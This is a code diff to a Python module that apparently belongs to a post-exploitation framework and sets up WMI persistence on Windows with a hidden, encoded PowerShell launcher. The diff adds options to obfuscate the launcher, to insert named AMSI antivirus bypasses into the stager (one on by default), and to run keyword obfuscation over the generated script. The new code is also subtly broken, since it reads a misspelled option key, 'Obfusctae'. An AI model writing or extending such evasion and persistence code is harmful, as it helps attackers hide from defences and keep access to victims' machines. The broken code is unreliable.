@@ -52,11 +52,26 @@ class Module(object):
                 'Required'      :   True,
                 'Value'         :   'powershell -noP -sta -w 1 -enc '
             },
-            #'Listener' : {
-            #    'Description'   :   'Listener to use.',
-            #    'Required'      :   False,
-            #    'Value'         :   ''
-            #},
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'DailyTime' : {
                 'Description'   :   'Daily time to trigger the script (HH:mm).',
                 'Required'      :   False,
@@ -116,7 +131,12 @@ class Module(object):
 
 
     def generate(self):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         #listenerName = self.options['Listener']['Value']
         launcher_prefix = self.options['Launcher']['Value']
         
@@ -129,6 +149,13 @@ class Module(object):
         extFile = self.options['ExtFile']['Value']
         cleanup = self.options['Cleanup']['Value']
         webFile = self.options['WebFile']['Value']
+        if (self.options['Obfusctae']['Value']).lower() == 'true':
+            Obfuscate =True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
         # staging options
         #userAgent = self.options['UserAgent']['Value']
         #proxy = self.options['Proxy']['Value']
@@ -206,5 +233,5 @@ class Module(object):
 
 
         script += "'WMI persistence established "+statusMsg+"'"
-
+        script = helpers.keyword_obfuscation(script, self.mainMenu)
         return script
